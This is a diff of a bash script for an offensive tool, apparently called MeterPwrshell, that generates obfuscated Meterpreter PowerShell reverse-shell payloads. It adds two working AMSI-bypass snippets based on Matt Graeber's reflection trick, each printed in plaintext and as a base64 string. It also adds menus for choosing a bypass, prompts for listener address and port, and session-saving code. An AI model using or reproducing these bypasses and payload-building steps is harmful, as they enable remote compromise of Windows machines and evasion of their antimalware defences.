@@ -1,24 +1,33 @@
 #!/usr/bin/bash
-#PLEASE GOD SOMEONE HELP ME IM TIRED ALREADY !!!!
 #----------colors and configs----------
 okegreen='\033[92m' #goddamn it please dont fucking change it
 red='\e[1;31m' #goddamn it please dont fucking change it
 BlueF='\e[1;34m' #goddamn it please dont fucking change it
 COWSAYFILE=/usr/bin/cowsay #goddamn it please dont fucking change it
 COWSAYFILESOURCE=/usr/games/cowsay #you can change this as you want
+#real code for base64 below : (([Ref].Assembly.gettypes() | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('QQBt'+'AHMAaQA'+'qAHQAaQB'+'sAHMA')))}).GetFields($([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('T'+'gB'+'vAG4AUAB1AGIAb'+'ABpAGMALABTAHQAYQB0A'+'GkAYwA=')))) | ? {$_.Name -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBAsE64String('Y'+'QBtAHMA'+'aQBJAG4Aa'+'QB0ACoAYQB'+'pAGwAZQ'+'BkAA==')))}).SetValue($null,$true)
 AMSIBYPASSCODEINBASE64="KAAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAGcAZQB0AHQAeQBwAGUAcwAoACkAIAB8ACAAPwAgAHsAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACQAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBBAHMARQA2ADQAUwB0AHIAaQBuAGcAKAAnAFEAUQBCAHQAJwArACcAQQBIAE0AQQBhAFEAQQAnACsAJwBxAEEASABRAEEAYQBRAEIAJwArACcAcwBBAEgATQBBACcAKQApACkAfQApAC4ARwBlAHQARgBpAGUAbABkAHMAKAAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAQQBzAEUANgA0AFMAdAByAGkAbgBnACgAJwBUACcAKwAnAGcAQgAnACsAJwB2AEEARwA0AEEAVQBBAEIAMQBBAEcASQBBAGIAJwArACcAQQBCAHAAQQBHAE0AQQBMAEEAQgBUAEEASABRAEEAWQBRAEIAMABBACcAKwAnAEcAawBBAFkAdwBBAD0AJwApACkAKQApACAAfAAgAD8AIAB7ACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAQQBzAEUANgA0AFMAdAByAGkAbgBnACgAJwBZACcAKwAnAFEAQgB0AEEASABNAEEAJwArACcAYQBRAEIASgBBAEcANABBAGEAJwArACcAUQBCADAAQQBDAG8AQQBZAFEAQgAnACsAJwBwAEEARwB3AEEAWgBRACcAKwAnAEIAawBBAEEAPQA9ACcAKQApACkAfQApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkACgA=" #this is the default one....please dont change
 ATTACKERARCH=`dpkg --print-architecture` #goddamn it please dont fucking change it
 DETECTINTERNETCONNECTION=yes #not recommended to change it but you can change it to "no"
-DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no" 
+DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no"
 ENABLEROOTDETECTOR=yes #not recommended to change it but you can change it to "no"
 SESSIONID=$RANDOM #goddamn it please dont fucking change it
 VERSION=v3.1.0 #goddamn it please dont fucking change it
+boldcharacters=$(tput bold) #this variable is needed cause some of the text was not bolded automaticly
 #------------colors and configs----------
 #deleting old debug.log
 rm debug.log &> /dev/null
 touch debug.log &> /dev/null
-#control-c code
-exitdacode ()
+#use this func stdout for checking wether the directory is empty or not
+isthatempty ()
+{
+    local dir="$1"
+    shopt -s nullglob
+    local files=( "$dir"/* "$dir"/.* )
+    [[ ${#files[@]} -eq 2 ]]
+}
+#execute this func if we detect control-c pressed
+control-cexit ()
 {
 echo ""
 echo -e $red "[!!!] Control-C Catched [!!!]"
@@ -27,13 +36,18 @@ rm 1xencrypted.ps1 &> /dev/null
 rm 1.ps1 &> /dev/null
 rm dontremove.txt &> /dev/null
 rm xencrypt.ps1 &> /dev/null
+if [ -d "output/" ]; then
+    if isthatempty output/; then
+        rm output -rf &> /dev/null
+    fi
+fi
 echo -e $red "Exiting ..."
 read -t 2
 exit
 }
-#control-c catcher
-trap exitdacode SIGINT
-#session id 
+#control-c catcher/detector
+trap control-cexit SIGINT
+#session id
 echo "#SESSION ID NUMBER : $SESSIONID" &>> debug.log
 #write program configs on debug.log
 echo "#ProgramConfigs" &>> debug.log
@@ -70,8 +84,8 @@ if [ $DETECTATTACKERLINUXDISTRIBUTION = "yes" ]; then
         echo -e $red "[---] Linux Distribution Supported [---]"
         echo "#linux distribution = ubuntu" &>> debug.log
     else
-        echo -e $red "[!!!WARNING!!!] LINUX DISTRIBUTION UNSUPPORTED [!!!WARNING!!!]"
-        echo -e $red "[!!!WARNING!!!] THIS PROGRAM ONLY SUPPORT DEBIAN-BASED LINUX DISTRIBUTION [!!!WARNING!!!]"
+        echo -e $red "[!!!WARNING!!!] YOUR LINUX DISTRIBUTION, $ATTACKERLINUXDISTRIBUTION, IS UNSUPPORTED [!!!WARNING!!!]"
+        echo -e $red "[!!!WARNING!!!] THIS PROGRAM ONLY SUPPORT DEBIAN,UBUNTU,AND KALI LINUX DISTRIBUTION [!!!WARNING!!!]"
         echo -e $red "Exiting ..."
         read -t 2
         exit 1
@@ -85,6 +99,7 @@ if [ $DETECTINTERNETCONNECTION = "yes" ]; then
         echo -e $red "Continuing ..."
         read -t 2
         echo "#internet connection : alive" &>> debug.log
+        internetconnection="alive"
     else
         echo -e $red "[!!!] Internet Connection : Dead [!!!]"
         echo -e $red "[!!!] THIS TOOL NEED INTERNET CONNECTION [!!!]"
@@ -104,6 +119,7 @@ if [ $DETECTINTERNETCONNECTION = "no" ]; then
             echo -e $red "Continuing ..."
             read -t 2
             echo "#internet connection : unsure" &>> debug.log
+            internetconnection="unsure"
             break
         fi
         if [ "$continuewithoutinternet" = "no" ]; then
@@ -125,28 +141,32 @@ if [ -f "$COWSAYFILE" ]; then
     echo "cowsay executeable file exist" &>> debug.log
 else
     echo "cowsay executeable file didnt exist...linking from /usr/share/games/cowsay to /usr/bin/cowsay" &>> debug.log
-    ln -s $COWSAYFILESOURCE $COWSAYFILE &>> debug.log
+    ln -s $COWSAYFILESOURCE $COWSAYFILE 2>> debug.log
 fi
 while true; do
     if [ -d "output/" ]; then
-        echo -ne $red "Have You Backed Up The Old output/ Directory Yet??? (yes/no) : "
-        read outputdirectorybackup
-        if [ "$outputdirectorybackup" = "no" ] ; then
-            echo -e $red "[!!!WARNING!!!] We Will Delete Old output/ Directory [!!!WARNING!!!]"
-            echo -e $red "[!!!WARNING!!!] Please Backup It Now !!! [!!!WARNING!!!]"
-            echo -e $red "Exiting ......"
-            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
-            exit
-        fi
-        if [ "$outputdirectorybackup" = "yes" ] ; then
-            echo -e $red "Okie Dokie Than :)"
-            echo -e $red "Removing And Continuing ......"
-            echo "#removing old output/ directory" &>> debug.log
-            rm -rf output/ &>> debug.log
-            read -t 3
-            break
+        if ! isthatempty output/; then
+            echo -ne $red "Have You Backed Up The Old output/ Directory Yet??? (yes/no) : "
+            read outputdirectorybackup
+            if [ "$outputdirectorybackup" = "no" ] ; then
+                echo -e $red "[!!!WARNING!!!] We Will Delete Old output/ Directory [!!!WARNING!!!]"
+                echo -e $red "[!!!WARNING!!!] Please Backup It Now !!! [!!!WARNING!!!]"
+                echo -e $red "Exiting ......"
+                cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
+                exit
+            fi
+            if [ "$outputdirectorybackup" = "yes" ] ; then
+                echo -e $red "Okie Dokie Than :)"
+                echo -e $red "Removing And Continuing ......"
+                echo "#removing old output/ directory" &>> debug.log
+                rm -rf output/ &>> debug.log
+                read -t 3
+                break
+            else
+                echo -e $red " [!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+            fi
         else
-            echo -e $red " [!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+            break
         fi
     else
         break
@@ -199,31 +219,32 @@ clear
 checkmeterpreterpayload ()
 {
 cat << !
-  Generate PowerShell Payload Input
-  +-------------------------++-------------------------++-----------------------+
-  | Name                    ||  Descript               || Your Input
-  +-------------------------++-------------------------++-----------------------+
-  | LHOST                   ||  The Listen Address     || $yourip
-  | LPORT                   ||  The Listen Ports       || $yourport
-  | PAYFILETYPE             ||  The Payload Type       || $msfpaytype
-  | ARCH                    ||  The Payload Arch       || $payarch
-  | BYPASS AMSI             ||  Bypass The AMSI        || $bypassamsi
-  | AMSI BYPASS TECHNIQUE   ||  AMSI Bypass Technique  || $amsibypasstechnique
-  +-------------------------++-------------------------++-----------------------+
+ Generate PowerShell Payload Input
+ +-------------------------++-------------------------++-----------------------+
+ | Name                    ||  Descript               || Your Input
+ +-------------------------++-------------------------++-----------------------+
+ | LHOST                   ||  The Listen Address     || $yourip
+ | LPORT                   ||  The Listen Ports       || $yourport
+ | PAYFILETYPE             ||  The Payload Type       || $msfpaytype
+ | ARCH                    ||  The Payload Arch       || $payarch
+ | BYPASS AMSI             ||  Bypass The AMSI        || $bypassamsi
+ | AMSI BYPASS TECHNIQUE   ||  AMSI Bypass Technique  || $amsibypasstechnique
+ +-------------------------++-------------------------++-----------------------+
 !
 }
 
 checkcustompayload ()
 {
 cat << !
-  Generate PowerShell Payload Input
-  +--------------------------------++--------------------------++-----------------------+
-  | Name                           ||  Descript                || Your Input
-  +--------------------------------++--------------------------++-----------------------+
-  | CUSTOM POWERSHELL PAYLOAD PATH ||  The Custom Payload Path || $custompayloadpath
-  | VICTIM ARCHITECTURE            ||  The Victim Architecture || $victimarch
-  | BYPASS AMSI                    ||  Bypass The AMSI         || $bypassamsi
-  +--------------------------------++--------------------------++-----------------------+
+ Generate PowerShell Payload Input
+ +--------------------------------++--------------------------++-----------------------+
+ | Name                           ||  Descript                || Your Input
+ +--------------------------------++--------------------------++-----------------------+
+ | CUSTOM POWERSHELL PAYLOAD PATH ||  The Custom Payload Path || $custompayloadpath
+ | VICTIM ARCHITECTURE            ||  The Victim Architecture || $victimarch
+ | BYPASS AMSI                    ||  Bypass The AMSI         || $bypassamsi
+ | AMSI BYPASS TECHNIQUE          ||  AMSI Bypass Technique   || $amsibypasstechnique
+ +--------------------------------++--------------------------++-----------------------+
 !
 }
 
@@ -270,7 +291,7 @@ fi
 
 #menu/banner
 echo ""
-echo -e $okegreen " [---] MeterPwrshell - Meterpreter Powershell Payload With Base64 Encoded [---] "
+echo -e $okegreen "${boldcharacters} [---] MeterPwrshell - Meterpreter Powershell Payload With Base64 Encoded [---] "
 echo -e $okegreen "  [---Generate OneLiner Meterpreter Powershell Payload With Base64 Encoded---]  "
 bannerrandomizer
 showbanner
@@ -288,7 +309,7 @@ setpayloadvariables ()
 echo -e $BlueF "Enter It Blank If You Want To Use Default Option"
 echo -e $BlueF "[-----------------------------------------------------------] "
 while true; do
-    echo -ne $BlueF "Do You Want To Use Your Custom Powershell Payload ??? (Default = no) (yes/no) : ";tput sgr0
+    echo -ne $BlueF "Do You Want To Use Your Own Custom Powershell Payload ??? (Default = no) (yes/no) : ";tput sgr0
     read custompayload
     if [ -z "$custompayload" ]; then
         custompayload=no
@@ -333,6 +354,28 @@ while true; do
                         if [ -z "$customamsibypasscode" ]; then
                             echo -e $BlueF "Okie Dokie If You Want To Use Default AMSI Bypass Code"
                             read -t 2
+                            while true; do
+                                echo -e $BlueF " [--------------------] "
+                                echo -e $BlueF "There Is Two Default AMSI Bypass Code,Plase Choose Between One Of Them !!!"
+                                echo -e $BlueF "All Of This Option Has Been Base64 Encoded,So Chill Out Mate :D"
+                                echo -e $BlueF "1. Matt Graebers Reflection Method Bypass With Changes To Avoid Trigger The AMSI"
+                                echo -e $BlueF "2. Matt Graebers Reflection Method Bypass With Some HEAVY Obfuscation By https://amsi.fail"
+                                echo -ne $BlueF "Please Choose The Default AMSI Bypass Code : ";tput sgr0
+                                read choosingdefaultamsibypasscode
+                                if [ $choosingdefaultamsibypasscode = "1" ]; then
+                                    echo -e $BlueF "Whatever You Like, Pal :D"
+                                    #the amsibypasscode value has been setted in the beginning of the code
+                                    break
+                                elif [ $choosingdefaultamsibypasscode = "2" ]; then
+                                    echo -e $BlueF "Whatever You Like, Pal :D"
+                                    unset AMSIBYPASSCODEINBASE64
+                                    #real code for base64 below (maked by https://amsi.fail) : [Ref].Assembly.GetType('System.Management.Automation.'+$([char](7+58)+[cHAR](24+85)+[ChAr]([ByTE]0x73)+[char](105))+'Utils').GetField($([chaR]([byTe]0x61)+[chaR](109)+[CHAr]([Byte]0x73)+[ChAr](124-19)+[cHAr](73)+[cHar]([ByTE]0x6E)+[cHar](150-45)+[CHAR](208-92)+[chAR]([bytE]0x46)+[chaR]([BYTE]0x61)+[ChaR]([bYtE]0x69)+[ChaR](5076/47)+[cHAR](157-56)+[cHaR]([BYTE]0x64)),'NonPublic,Static').SetValue($null,$true);
+                                    AMSIBYPASSCODEINBASE64="WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACcAKwAkACgAWwBjAGgAYQByAF0AKAA3ACsANQA4ACkAKwBbAGMASABBAFIAXQAoADIANAArADgANQApACsAWwBDAGgAQQByAF0AKABbAEIAeQBUAEUAXQAwAHgANwAzACkAKwBbAGMAaABhAHIAXQAoADEAMAA1ACkAKQArACcAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACQAKABbAGMAaABhAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA2ADEAKQArAFsAYwBoAGEAUgBdACgAMQAwADkAKQArAFsAQwBIAEEAcgBdACgAWwBCAHkAdABlAF0AMAB4ADcAMwApACsAWwBDAGgAQQByAF0AKAAxADIANAAtADEAOQApACsAWwBjAEgAQQByAF0AKAA3ADMAKQArAFsAYwBIAGEAcgBdACgAWwBCAHkAVABFAF0AMAB4ADYARQApACsAWwBjAEgAYQByAF0AKAAxADUAMAAtADQANQApACsAWwBDAEgAQQBSAF0AKAAyADAAOAAtADkAMgApACsAWwBjAGgAQQBSAF0AKABbAGIAeQB0AEUAXQAwAHgANAA2ACkAKwBbAGMAaABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA2ADEAKQArAFsAQwBoAGEAUgBdACgAWwBiAFkAdABFAF0AMAB4ADYAOQApACsAWwBDAGgAYQBSAF0AKAA1ADAANwA2AC8ANAA3ACkAKwBbAGMASABBAFIAXQAoADEANQA3AC0ANQA2ACkAKwBbAGMASABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA2ADQAKQApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsACgA="
+                                    break
+                                else
+                                    echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+                                fi
+                            done
                             break
                         fi
                         if [ -n "$customamsibypasscode" ]; then
@@ -390,7 +433,28 @@ while true; do
                         read customamsibypasscode
                         if [ -z "$customamsibypasscode" ]; then
                             echo -e $BlueF "Okie Dokie If You Want To Use Default AMSI Bypass Code"
-                            read -t 2
+                            while true; do
+                                echo -e $BlueF " [--------------------] "
+                                echo -e $BlueF "There Is Two Default AMSI Bypass Code,Plase Choose Between One Of Them !!!"
+                                echo -e $BlueF "All Of This Option Has Been Base64 Encoded,So Chill Out Mate :D"
+                                echo -e $BlueF "1. Matt Graebers Reflection Method Bypass With Changes To Avoid Trigger The AMSI"
+                                echo -e $BlueF "2. Matt Graebers Reflection Method Bypass With Some HEAVY Obfuscation By https://amsi.fail"
+                                echo -ne $BlueF "Please Choose The Default AMSI Bypass Code : ";tput sgr0
+                                read choosingdefaultamsibypasscode
+                                if [ $choosingdefaultamsibypasscode = "1" ]; then
+                                    echo -e $BlueF "Whatever You Like, Pal :D"
+                                    #the amsibypasscode value has been setted in the beginning of the code
+                                    break
+                                elif [ $choosingdefaultamsibypasscode = "2" ]; then
+                                    echo -e $BlueF "Whatever You Like, Pal :D"
+                                    unset AMSIBYPASSCODEINBASE64
+                                    #real code for base64 below (maked by https://amsi.fail) : [Ref].Assembly.GetType('System.Management.Automation.'+$([char](7+58)+[cHAR](24+85)+[ChAr]([ByTE]0x73)+[char](105))+'Utils').GetField($([chaR]([byTe]0x61)+[chaR](109)+[CHAr]([Byte]0x73)+[ChAr](124-19)+[cHAr](73)+[cHar]([ByTE]0x6E)+[cHar](150-45)+[CHAR](208-92)+[chAR]([bytE]0x46)+[chaR]([BYTE]0x61)+[ChaR]([bYtE]0x69)+[ChaR](5076/47)+[cHAR](157-56)+[cHaR]([BYTE]0x64)),'NonPublic,Static').SetValue($null,$true);
+                                    AMSIBYPASSCODEINBASE64="WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACcAKwAkACgAWwBjAGgAYQByAF0AKAA3ACsANQA4ACkAKwBbAGMASABBAFIAXQAoADIANAArADgANQApACsAWwBDAGgAQQByAF0AKABbAEIAeQBUAEUAXQAwAHgANwAzACkAKwBbAGMAaABhAHIAXQAoADEAMAA1ACkAKQArACcAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACQAKABbAGMAaABhAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA2ADEAKQArAFsAYwBoAGEAUgBdACgAMQAwADkAKQArAFsAQwBIAEEAcgBdACgAWwBCAHkAdABlAF0AMAB4ADcAMwApACsAWwBDAGgAQQByAF0AKAAxADIANAAtADEAOQApACsAWwBjAEgAQQByAF0AKAA3ADMAKQArAFsAYwBIAGEAcgBdACgAWwBCAHkAVABFAF0AMAB4ADYARQApACsAWwBjAEgAYQByAF0AKAAxADUAMAAtADQANQApACsAWwBDAEgAQQBSAF0AKAAyADAAOAAtADkAMgApACsAWwBjAGgAQQBSAF0AKABbAGIAeQB0AEUAXQAwAHgANAA2ACkAKwBbAGMAaABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA2ADEAKQArAFsAQwBoAGEAUgBdACgAWwBiAFkAdABFAF0AMAB4ADYAOQApACsAWwBDAGgAYQBSAF0AKAA1ADAANwA2AC8ANAA3ACkAKwBbAGMASABBAFIAXQAoADEANQA3AC0ANQA2ACkAKwBbAGMASABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA2ADQAKQApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAAsACQAdAByAHUAZQApADsACgA="
+                                    break
+                                else
+                                    echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+                                fi
+                            done
                             break
                         fi
                         if [ -n "$customamsibypasscode" ]; then
@@ -425,18 +489,97 @@ while true; do
 done
 echo -e $BlueF "[-----------------------------------------------------------] "
 }
-setpayloadvariables
-if [ $custompayload = no ]; then
-    checkmeterpreterpayload
-else
-    checkcustompayload
+while true; do
+    if [ -f .sessionvalues*/sessiontype.txt ]; then
+        sessiontype=`cat .sessionvalues*/sessiontype.txt`
+        lastsessionid=`cat .sessionvalues*/sessionid.txt`
+        if [ $sessiontype = "defaultpayload" ]; then
+            yourip=`cat .sessionvalues*/lhost.txt`
+            yourport=`cat .sessionvalues*/lport.txt`
+            msfpaytype=`cat .sessionvalues*/msfpaytype.txt`
+            payarch=`cat .sessionvalues*/payarch.txt`
+            bypassamsi=`cat .sessionvalues*/bypassamsi.txt`
+            if [ $bypassamsi = yes ]; then
+                amsibypasstechnique=`cat .sessionvalues*/amsibypasstechnique.txt`
+                if [ $amsibypasstechnique = amsibypasscode ]; then
+                    AMSIBYPASSCODEINBASE64=`cat .sessionvalues*/amsibypasscodeinbase64.txt`
+                fi
+            fi
+        elif [ $sessiontype = "custompayload" ]; then
+            custompayloadpath=`cat .sessionvalues*/custompayloadpath.txt`
+            victimarch=`cat .sessionvalues*/victimarch.txt`
+            bypassamsi=`cat .sessionvalues*/bypassamsi.txt`
+            if [ $bypassamsi = yes ]; then
+                amsibypasstechnique=`cat .sessionvalues*/amsibypasstechnique.txt`
+                if [ $amsibypasstechnique = amsibypasscode ]; then
+                    AMSIBYPASSCODEINBASE64=`cat .sessionvalues*/amsibypasscodeinbase64.txt`
+                fi
+            fi
+        fi
+        if [ $sessiontype = "custompayload" ]; then
+            checkcustompayload
+        else
+            checkmeterpreterpayload
+        fi
+        echo -ne "Do You Want To Use Values From Last Session (Session ID : $lastsessionid) ??? (yes/no) : "
+        read usevaluesfromlastsession
+        if [ $usevaluesfromlastsession = "yes" ]; then
+            echo -e $BlueF "Okie Dokie :) Continuing ..."
+            break
+        elif [ $usevaluesfromlastsession = "no" ]; then
+            if [ $sessiontype = "defaultpayload" ]; then
+                unset yourip
+                unset yourport
+                unset msfpaytype
+                unset payarch
+                unset bypassamsi
+                unset amsibypasstechnique
+            elif [ $sessiontype = "custompayload" ]; then
+                unset custompayloadpath
+                unset victimarch
+                unset bypassamsi
+                unset amsibypasstechnique
+            fi
+            setpayloadvariables
+            break
+        fi
+    else
+        setpayloadvariables
+        break
+    fi
+done
+if [ "$usevaluesfromlastsession" = no ]; then
+    if [ "$custompayload" = no ]; then
+        checkmeterpreterpayload
+    else
+        checkcustompayload
+    fi
+elif [ "$usevaluesfromlastsession" = yes ]; then
+    if [ "$sessiontype" = "custompayload" ]; then
+        checkcustompayload
+    else
+        checkmeterpreterpayload
+    fi
 fi
 while true; do
-    echo -e $BlueF "The LHOST, LPORT, PAYLOAD, and *ARCH Values ​​Must Be Correct !!!"
+    echo -e $BlueF "The LHOST, LPORT, PAYLOAD, CUSTOMPAYLOADPATH, and *ARCH Values ​​Must Be Correct !!!"
     echo -ne $BlueF "Are The Values Are Correct ??? (yes/no) : "
     read isthevaluescorrect
     if [ "$isthevaluescorrect" = "no" ]; then
         echo -e $BlueF "Resetting All Variables ..."
+        if [ "$custompayload" = "no" ]; then
+            unset yourip
+            unset yourport
+            unset msfpaytype
+            unset payarch
+            unset bypassamsi
+            unset amsibypasstechnique
+        elif [ "$custompayload" = "yes" ]; then
+            unset custompayloadpath
+            unset victimarch
+            unset bypassamsi
+            unset amsibypasstechnique
+        fi
         read -t 2
         echo -e $BlueF "[-----------------------------------------------------------] "
         setpayloadvariables
@@ -450,12 +593,47 @@ while true; do
         echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
     fi
 done
+#removing last session values directory
+rm .sessionvalues* -rf
+#adds a hidden directory containing session values
+mkdir .sessionvalues$SESSIONID
+#storing values into seperate txt files
+if [ $custompayload = no ]; then
+    echo "$SESSIONID" &>> .sessionvalues$SESSIONID/sessionid.txt
+    echo "defaultpayload" &>> .sessionvalues$SESSIONID/sessiontype.txt
+    echo "$msfpath" &>> .sessionvalues$SESSIONID/msfpath.txt
+    echo "$msfpaytype" &>> .sessionvalues$SESSIONID/msfpaytype.txt
+    echo "$yourip" &>> .sessionvalues$SESSIONID/lhost.txt 
+    echo "$yourport" &>> .sessionvalues$SESSIONID/lport.txt
+    echo "$payarch" &>> .sessionvalues$SESSIONID/payarch.txt
+    echo "$bypassamsi" &>> .sessionvalues$SESSIONID/bypassamsi.txt
+    if [ $bypassamsi = yes ]; then
+        echo "$amsibypasstechnique" &>> .sessionvalues$SESSIONID/amsibypasstechnique.txt
+        if [ $amsibypasstechnique = amsibypasscode ]; then
+            echo "$AMSIBYPASSCODEINBASE64" &>> .sessionvalues$SESSIONID/amsibypasscodeinbase64.txt
+        fi
+    fi
+fi
+if [ $custompayload = yes ]; then
+    echo "$SESSIONID" &>> .sessionvalues$SESSIONID/sessionid.txt
+    echo "custompayload" &>> .sessionvalues$SESSIONID/sessiontype.txt
+    echo "$custompayloadpath" &>> .sessionvalues$SESSIONID/custompayloadpath.txt
+    echo "$victimarch" &>> .sessionvalues$SESSIONID/victimarch.txt
+    echo "$bypassamsi" &>> .sessionvalues$SESSIONID/bypassamsi.txt
+    if [ $bypassamsi = yes ]; then
+        echo "$amsibypasstechnique" &>> .sessionvalues$SESSIONID/amsibypasstechnique.txt
+        if [ $amsibypasstechnique = amsibypasscode ]; then
+            echo "$AMSIBYPASSCODEINBASE64" &>> .sessionvalues$SESSIONID/amsibypasscodeinbase64.txt
+        fi
+    fi
+fi
+#storing values into debug.log so people can easily see the variable values while troubleshooting
 if [ $custompayload = no ]; then
     echo "#variablevalues" &>> debug.log
     echo "your metasploit framework path : $msfpath" &>> debug.log
     echo "msfpayload : $msfpaytype" &>> debug.log
     echo "lhost/yourip : $yourip" &>> debug.log
-    echo "lport/yourpurt : $yourport" &>> debug.log
+    echo "lport/yourport : $yourport" &>> debug.log
     echo "payloadarchitecture : $payarch" &>> debug.log
     echo "bypass AMSI : $bypassamsi" &>> debug.log
     if [ $bypassamsi = yes ]; then
@@ -478,7 +656,7 @@ if [ $custompayload = yes ]; then
     fi
 fi
 echo -e $BlueF "Please Wait....This Gonna Take A Few Minutes.......Take A Cup Of Coffe Or Snack Maybe :)"
-#makingpayloadprocess
+#making de payload process
 if [ $custompayload = no ]; then
     if [ $bypassamsi = no ]; then
         echo "#making meterpreter powershell payload" &>> debug.log
@@ -592,7 +770,10 @@ if [ $custompayload = no ]; then
     echo -e $okegreen "[---] The Handler File Is On The : output/meterpwrshell.handler.$payarch.$SESSIONID.rc [---]"
 fi
 echo -e $okegreen "[---] The Debug File Is On The : debug.log [---]"
-
+echo -e $okegreen "[-----------------------------------------------------------] "
+echo -e $okegreen "[---] It Is Recommended To Check Whether Your Payload That Generted By MeterPwrShell Is Broken Or Not [---]"
+echo -e $okegreen "[---] You Can Check It At : https://raikia.com/tool-powershell-encoder/ [---]"
+echo -e $okegreen "[-----------------------------------------------------------] "
 while true; do
     if [ $custompayload = no ]; then
         echo -ne $okegreen "[---] Do You Want To Start The Metasploit Handler ??? [---] (yes/no) : ";tput sgr0
